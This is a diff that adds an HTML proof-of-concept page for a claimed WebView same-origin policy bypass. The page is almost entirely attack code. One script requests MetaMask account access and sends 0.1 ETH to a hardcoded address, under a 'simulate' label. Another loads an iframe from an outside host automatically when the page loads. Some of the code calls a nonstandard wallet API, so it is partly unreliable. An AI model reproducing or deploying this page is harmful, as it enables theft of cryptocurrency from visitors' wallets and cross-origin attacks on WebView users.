@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebView Same-Origin Policy Bypass PoC</title>
+</head>
+<body>
+
+<h1>WebView Same-Origin Policy Bypass PoC</h1>
+
+<!-- Function to simulate the transaction -->
+<script>
+async function simulateTransaction() {
+  // Check if MetaMask is installed and connected
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      // Request access to the user's accounts
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+      const recipientAddress = '0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2'; // Replace with the recipient's address
+      const amountToSend = '0.1'; // Specify the amount in ETH as a string
+
+      // Create a transaction object
+      const transaction = {
+        to: recipientAddress,
+        value: window.ethereum.utils.toWei(amountToSend, 'ether'), // Convert ETH to Wei
+      };
+
+      // Send the transaction
+      await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [transaction],
+      });
+
+      // Display a success message
+      alert('Transaction successfully sent!');
+    } catch (error) {
+      // Handle errors
+      alert(`Transaction failed: ${error.message}`);
+    }
+  } else {
+    // MetaMask not found
+    alert('MetaMask is not installed or not connected.');
+  }
+}
+</script>
+
+<!-- Trigger the PoC -->
+<button onclick="simulateTransaction()">Simulate Transaction</button>
+
+<!-- Function to demonstrate the Same-Origin Policy Bypass -->
+<script>
+function exploitSameOriginPolicy() {
+  // This script attempts to exploit the Same-Origin Policy Bypass vulnerability
+  const iframe = document.createElement('iframe');
+  iframe.src = 'https://diff-origin.aogarantiza.com/chromiumwebview/window-open-iframe-js.html';
+  document.body.appendChild(iframe);
+}
+
+// Call the function to trigger the Same-Origin Policy Bypass
+exploitSameOriginPolicy();
+</script>
+
+</body>
+</html>
